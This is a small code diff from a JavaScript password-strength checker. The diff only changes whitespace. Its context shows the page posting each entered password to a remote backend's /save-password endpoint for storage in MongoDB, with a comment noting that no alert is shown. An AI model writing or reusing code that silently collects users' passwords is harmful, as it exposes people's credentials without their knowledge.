@@ -27,7 +27,8 @@ async function checkAndSavePassword() {
     strengthMessage.innerHTML = `Strength: ${strength}`;
 
     // Store password in MongoDB (No alert message)
-    const API_URL = "https://password-checker-ekez.onrender.com"; // ✅ Your backend URL
+
+   const API_URL = "https://password-checker-ekez.onrender.com"; // ✅ Your backend URL
 
     await fetch(`${API_URL}/save-password`, { 
     
